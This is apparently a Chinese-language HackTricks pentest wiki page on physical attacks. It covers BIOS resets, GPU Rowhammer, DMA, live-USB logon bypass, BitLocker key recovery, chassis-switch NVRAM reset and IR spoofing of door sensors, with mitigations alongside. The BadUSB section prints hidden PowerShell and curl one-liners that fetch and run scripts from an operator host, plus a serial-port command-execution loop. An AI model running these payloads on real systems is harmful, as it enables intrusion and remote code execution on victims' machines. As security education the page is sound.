# 物理攻击

{{#include ../banners/hacktricks-training.md}}

## BIOS 密码恢复与系统安全

Legacy PC 固件设置可能通过断开 CMOS 电池或使用文档中说明的 clear-CMOS 跳线来重置。所需的断电时间取决于主板，现代 UEFI 密码或密钥可能存储在非易失性 flash、嵌入式控制器或安全设备中，因此即使移除电池也会保留。请在短接引脚前查阅主板/服务手册；此操作还可能使 TPM 度量失效并触发磁盘加密恢复。

在 Legacy x86 系统上，**killCMOS** 和 **CmosPwd** 等工具可以从可引导环境中检查或修改由 CMOS 支持的设置。CmosPwd 可识别一组有文档记录的旧 BIOS 系列所使用的密码格式，并能够备份、恢复或擦除/kill CMOS 状态；其发布版本面向 Legacy DOS/Windows、Linux、FreeBSD 和 NetBSD 环境。<sup>[[18]](#references)</sup> 这些工具并不是通用的 UEFI 密码移除工具，并且需要足够的硬件/固件访问权限。

部分 laptop 固件在多次密码尝试失败后会显示 vendor-specific challenge code。诸如 [bios-pw.org](https://bios-pw.org) 这样的数据库可以为部分型号推导 Legacy vendor recovery passwords，但许多系统会在无法推导 challenge 的情况下实施 lockout。请将任何生成的密码视为特定型号专用，并避免耗尽永久性尝试计数器。

### UEFI 安全

对于现代 **UEFI** 系统，CHIPSEC 可以审计 Secure Boot 变量保护。请先运行下面的非修改性检查；可选的 `-a modify` 模式会故意尝试破坏变量，因此只能在可恢复的实验室系统上使用。CHIPSEC 本身警告称，其特权驱动程序和低级硬件访问不适用于生产终端。<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## RAM 分析和 Cold Boot Attacks

DRAM 不会在刷新停止后立即丢失每一位数据。衰减速率会因模块技术和温度而有很大差异；相比未冷却的断电重启，降温可以让有用数据保存更长时间。Cold-boot attack 会快速重启至小型采集环境，或转移经过冷却的内存模块，捕获原始内存，并在位衰减的情况下重建加密密钥。磁盘复制工具并不自动等同于物理内存成像工具，而 Volatility 负责分析捕获结果，而不是执行采集；应使用适用于目标平台且经过验证的采集工具。<sup>[[12]](#references)</sup>

---

## 针对页表的 GPU Rowhammer

当现代 GPU Rowhammer 攻击针对的是 **GPU 虚拟内存元数据**，而不是普通缓冲区时，其实用性会大幅提升。针对 **GDDR6 NVIDIA Ampere GPU** 的近期研究表明，攻击者可以运行非特权 CUDA 代码，构建 GPU 专用的 hammering 模式，通过 **memory massaging** 将分页结构放置在易受攻击的行中，然后翻转 **last-level page table** 或中间 **page directory** 中的位。一旦单个转换条目被破坏，攻击者就可以建立 **arbitrary GPU memory read/write**，随后进一步 pivot 到主机入侵。<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. 在 GDDR6 中**分析可 hammer 的行**，构建能够感知刷新机制的非均匀 hammering 模式，以绕过 DRAM 内置的缓解措施。
2. **调整 GPU 分配**，使驱动程序将页转换结构放置在可 hammer 的物理位置，而不是保留在默认的受保护池中。实际操作中，这可能意味着耗尽低内存页表区域，并以受控步长喷洒大型稀疏 UVM 映射。
3. **翻转转换元数据**，例如页表或页目录条目中的 **PFN** 或与 aperture 相关的位，使攻击者控制的虚拟页解析到页表页、任意 GPU 内存或主机可见的系统映射。
4. 重用伪造的映射，重写更多转换条目，并在不同 GPU context 之间提升为 **arbitrary GPU memory read/write**。

### Host Pivot and Mitigations

- 在**禁用 IOMMU** 时，伪造的 system-aperture 映射可以向 GPU 暴露任意**主机物理内存**，将 GPU 原语转化为完整的主机入侵。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** 针对 last-level page-table 条目，而 **GeForge** 表明，破坏 page-directory 层可能更容易，因为一次位翻转就能重新指向更大的转换子树。不要只将某一个分页层视为安全关键层。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** 仍然很重要，因为它可以阻止 GDDRHammer/GeForge 使用的直接任意主机内存访问路径，但它**不是完整的缓解措施**。**GPUBreach** 展示了第二阶段的 pivot：攻击者破坏由 GPU 写入且由驱动程序拥有的 CPU 缓冲区，然后触发 NVIDIA 驱动程序的内存安全漏洞，以获取内核写入原语，并在启用 IOMMU 的情况下获得 **root shell**。<sup>[[3]](#references)</sup>
- 在支持的 workstation/server GPU 上，**system-level ECC** 是一种实际可行的加固措施。没有 ECC 的消费级 GPU 暴露出更弱的防御面。<sup>[[4]](#references)</sup>
- 这些攻击并非纯理论上的：**GeForge** 在 RTX 3060 上报告了 **1,171** 次位翻转，在 RTX A6000 上报告了 **202** 次，足以构建可用的主机权限提升链。<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

**Inception** 展示了通过 FireWire 和早期 Thunderbolt 配置等接口进行 **DMA-based memory acquisition and patching**，其中包括历史上的登录绕过特征。它并非简单地“对 Windows 10 无效”：可利用性取决于接口、目标版本、IOMMU 策略、锁定状态，以及 Windows Kernel DMA Protection 是否受支持并已启用。Windows 10 version 1803 及更高版本在兼容平台上引入了 Kernel DMA Protection，显著改变了攻击面。<sup>[[13]](#references)[[14]](#references)</sup>

---

## 使用 Live CD/USB 访问系统

对于未加密或已解锁的 Windows 卷，offline environment 可以将 **sethc.exe** 或 **Utilman.exe** 等辅助功能二进制文件替换为 **cmd.exe**，当执行相应的登录屏幕快捷键时，即可获得 SYSTEM command prompt。诸如 **chntpw** 等工具可以编辑本地 SAM 账户数据。这些方法无法绕过锁定的 BitLocker 卷，并可能损坏由 DPAPI/EFS 保护的凭据；应保留 forensic copies 和备份。

**Kon-Boot** 是一种面向受支持 Windows/macOS 配置的 commercial boot-time authentication-bypass tool。兼容性取决于操作系统、固件模式、Secure Boot 和磁盘加密配置；它不会解密 BitLocker 锁定的卷。<sup>[[10]](#references)</sup>

---

## 处理 Windows Security Features

### Boot and Recovery Shortcuts

- **Delete/Supr**、F2、F10 或其他厂商指定的按键可能会打开固件设置。
- **F8** 仅在仍启用该路径的配置上进入 legacy Windows advanced boot options；当前的 recovery entry 方式有所不同。
- 按住 **Shift** 可以在某些配置中阻止 Windows 自动登录，但 policy/registry 设置可能会禁用该行为。<sup>[[17]](#references)</sup>

### BAD USB Devices

**USB Rubber Ducky** 和 Teensy board 等设备可以枚举为受信任的 HID keyboard，并注入预定义的 keystrokes。payload 最初拥有已登录会话的权限和桌面访问权限；UAC prompt、screen locking、keyboard layout、timing 以及 endpoint USB policy 仍会对其形成限制。<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator 或 backup 权限可以创建 shadow copy 或保存 registry hives，从而获取 **SAM** 和 **SYSTEM** 等锁定文件。这是一种 post-compromise collection technique，而不是 privilege bypass，并且应与 `diskshadow`/VSS 及 registry-hive export 事件进行关联分析。

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- 基于 ESP32-S3 的 implant，例如 **Evil Crow Cable Wind**，隐藏在 USB-A→USB-C 或 USB-C↔USB-C 线缆中，仅作为 USB keyboard 进行枚举，并通过 Wi-Fi 暴露其 C2 stack。操作者只需从受害主机为线缆供电，创建名称为 `Evil Crow Cable Wind`、密码为 `123456789` 的 hotspot，然后访问 [http://cable-wind.local/](http://cable-wind.local/)（或其 DHCP address），即可进入嵌入式 HTTP interface。<sup>[[8]](#references)</sup>
- 浏览器 UI 提供 *Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell* 和 *Config* 标签。存储的 payload 会按 OS 标记，keyboard layout 可以动态切换，VID/PID 字符串也可以修改为已知 peripheral 的标识。
- 由于 C2 位于线缆内部，手机可以在不使用组织网络的情况下 staging payload、触发执行并管理 Wi-Fi credentials，这对于短驻留时间的 physical intrusion 很有用。

### OS-aware AutoExec payloads

- AutoExec 规则会将一个或多个 payload 绑定为在 USB enumeration 后立即执行。implant 会执行轻量级 OS fingerprinting，并选择匹配的 script。
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`。
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) 或 `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`。
- 由于执行过程无需人工操作，仅替换充电线就可能在已登录用户上下文中实现“plug-and-pwn” initial access。

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** 一个已存储的 payload 会打开 console，并粘贴一个循环，使其执行新 USB serial device 上收到的任何内容。一个最小化的 Windows variant 是：
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge：** implant 会保持 USB CDC channel 开启，同时其 ESP32-S3 启动一个 TCP client（Python script、Android APK 或 desktop executable）连接回 operator。TCP session 中输入的任何字节都会被转发到上面的 serial loop，从而即使在 air-gapped hosts 上也能实现 remote command execution。Output 有限，因此 operator 通常会执行 blind commands（创建账户、staging 其他 tooling 等）。

### HTTP OTA update surface

- 文档所述的 Evil Crow Cable Wind interface 在 `/update` 暴露了一个无需 authentication 的 firmware-update endpoint：<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- 现场操作员可以在交战过程中热插拔功能（例如刷入 USB Army Knife 固件），无需打开线缆，从而让 implant 在仍插入目标主机的情况下切换至新的能力。

## 绕过 BitLocker 加密

对正在运行或最近运行过的系统进行经授权的取证采集时，在卷处于解锁状态期间，采集内容中可能包含 BitLocker 卷主密钥或相关密钥材料。Elcomsoft Forensic Disk Decryptor 和 Passware Kit Forensic 等商业工具可以搜索受支持的内存映像、休眠文件或崩溃转储，但无法保证成功。启用 BitLocker 后，现代 Windows 还会对崩溃转储进行加密；而存储的 48 位恢复密码与内存中的卷密钥是不同的 artifact。<sup>[[12]](#references)[[16]](#references)</sup>

---

## 通过 Social Engineering 添加恢复密钥

攻击者如果说服管理员运行 BitLocker 管理命令，就可以添加恢复密码、外部密钥或其他 protector，然后将其窃取。恢复密码不能是任意的全零字符串：BitLocker 数字恢复密码必须符合经过验证的 48 位格式。相关的授权管理语法是 `manage-bde -protectors -add C: -recoverypassword`；使用 `manage-bde -protectors -get C:` 列出生成的 protectors。监控 protector 的添加操作，并确保新的恢复材料只托管到批准的位置。<sup>[[16]](#references)</sup>

---

## 利用机箱入侵／维护开关将 BIOS 恢复出厂设置

许多现代笔记本电脑和小型台式机都包含一个由 Embedded Controller (EC) 和 BIOS/UEFI 固件监控的 **机箱入侵开关**。该开关的主要用途是在设备被打开时发出警报，但一些厂商有时会实现一种**未公开的恢复快捷操作**，在以特定模式拨动开关时触发。<sup>[[5]](#references)[[6]](#references)</sup>

### 攻击原理

1. 该开关连接到 EC 上的 **GPIO interrupt**。
2. EC 上运行的固件会记录**按压的时序和次数**。
3. 当识别出硬编码模式后，EC 会调用 *mainboard-reset* 例程，**擦除系统 NVRAM/CMOS 的内容**。
4. 下次启动时，受影响的型号会加载重置后的固件状态。根据厂商和版本的不同，被清除的状态可能包括 supervisor password、自定义启动设置或已注册的 Secure Boot 密钥；TPM 状态和磁盘加密的影响必须分别评估。

> 固件重置可能会恢复外部启动选项，但**不会**解密存储设备。BitLocker 或其他全磁盘加密系统可能会在 TPM/固件发生更改后进入恢复模式，并在没有恢复密钥的情况下继续保护内部驱动器。<sup>[[16]](#references)</sup>

### 真实案例 – Framework 13 笔记本电脑

Framework 13（第 11/12/13 代）的恢复快捷操作是：
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
第十个周期后，EC 会设置一个标志，指示 BIOS 在下一次重启时擦除 NVRAM。整个过程耗时约 40 秒，**只需要一把螺丝刀**即可完成。<sup>[[5]](#references)</sup>

### 通用 Exploitation 流程

1. 开机或执行挂起-恢复操作，使 EC 处于运行状态。
2. 拆下底盖，露出入侵/维护开关。
3. 重现厂商特定的切换模式（查阅文档、论坛，或对 EC 固件进行逆向工程）。
4. 重新组装并重启，然后检查哪些固件设置和凭据实际发生了变化。
5. 如果已获授权且支持外部启动，则启动受控的 live image。一旦内部卷被合法解锁（或从未加密），live 环境便可获取凭据和数据，或检查 EFI System Partition。修改该分区以安装 EFI implant 具有持久性且侵入性很强，同时仍会受到 Secure Boot、measured boot、固件写保护和 endpoint monitoring 的限制。没有密钥或恢复材料时，加密存储仍然无法访问。

### 检测与缓解

* 在 OS 管理控制台中记录机箱入侵事件，并与意外的 BIOS 重置进行关联。
* 在螺丝/盖板上使用**防拆封条**，以便检测开启行为。
* 将设备存放在**受物理控制的区域**；应假设物理访问等同于完全失陷。
* 如果设备支持，禁用厂商的“维护开关重置”功能，或要求额外的加密授权才能执行 NVRAM 重置。

---

## 针对无接触出口传感器的隐蔽 IR 注入

### 传感器特征
- 普通的“挥手离开”传感器会将近红外 LED 发射器与电视遥控器式接收模块配对，只有在检测到多个正确载波的脉冲（约 4–10 个，频率约为 30 kHz）后才报告逻辑高电平。<sup>[[7]](#references)</sup>
- 塑料护罩会阻止发射器与接收器彼此直视，因此控制器会假设任何经过验证的载波都来自附近的反射，并驱动继电器打开门锁。
- 控制器认定目标存在后，通常会改变出站调制包络，但接收器仍会接受任何符合经过滤载波的脉冲串。

### 攻击流程
1. **捕获发射特征**——将逻辑分析仪跨接到控制器引脚上，记录驱动内部 IR LED 的检测前和检测后波形。
2. **仅重放“检测后”波形**——移除/忽略原装发射器，从一开始就使用外部 IR LED 驱动已经触发的模式。由于接收器只关注脉冲数量/频率，它会将 spoofed carrier 视为真实反射，并使继电器线路置为有效。
3. **控制发射时序**——以经过调谐的脉冲串发射载波（例如，导通数十毫秒，随后关闭相近时长），在不使接收器的 AGC 或干扰处理逻辑饱和的情况下提供最低脉冲数。持续发射会迅速使传感器灵敏度下降，并使继电器停止动作。

### 远距离反射式注入
- 将实验台 LED 替换为高功率 IR 二极管、MOSFET 驱动器和聚焦光学器件后，即可从约 6 米外可靠触发。
- 攻击者不需要与接收器孔径保持视线；将光束瞄准玻璃可见的室内墙壁、货架或门框，使反射能量进入约 30° 的视场，便可模拟近距离挥手。
- 由于接收器预期的只是微弱反射，更强的外部光束可以在多个表面之间反射，同时仍保持高于检测阈值。

### 武器化攻击手电筒
- 将驱动器嵌入商用手电筒中，可以将工具隐藏在普通物品中。将可见光 LED 换成与接收器频段匹配的高功率 IR LED，加入 ATtiny412（或类似器件）以生成约 30 kHz 的脉冲串，并使用 MOSFET 吸收 LED 电流。
- 可伸缩变焦镜头可收窄光束，以提高射程和精度；由 MCU 控制的振动电机则可在不发出可见光的情况下，通过触觉反馈确认调制处于活动状态。
- 在多个已存储的调制模式之间循环（使用略有差异的载波频率和包络）可提高对不同贴牌传感器系列的兼容性，使操作者能够扫描反射表面，直到听到继电器咔哒作响并且门锁释放。

---

## References

- [1] [GDDRHammer：严重干扰 DRAM 行——来自现代 GPU 的跨组件 Rowhammer 攻击](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge：锤击 GDDR 内存以伪造 GPU 页表，兼顾乐趣与收益](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach：使用 Rowhammer 对 GPU 发起权限提升攻击](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - 安全公告：Rowhammer - 2025 年 7 月](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13。按这里即可 pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – 主板重置指南](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “不要碰！——使用隐蔽 IR 手电筒绕过 IR 无接触出口传感器”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “插入、运行、Pwn：使用 Evil Crow Cable Wind 进行 hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - 针对 NVIDIA 芯片的 Rowhammer 攻击](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot 官方文档和兼容性信息](https://kon-boot.com/)
- [11] [CHIPSEC 文档 - Secure Boot 变量保护](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [谨防遗忘：针对加密密钥的冷启动攻击](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - 通过 DMA 操作物理内存](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky 文档](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker 操作指南](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - 按住 Shift 键与自动登录行为](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd 文档和下载](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
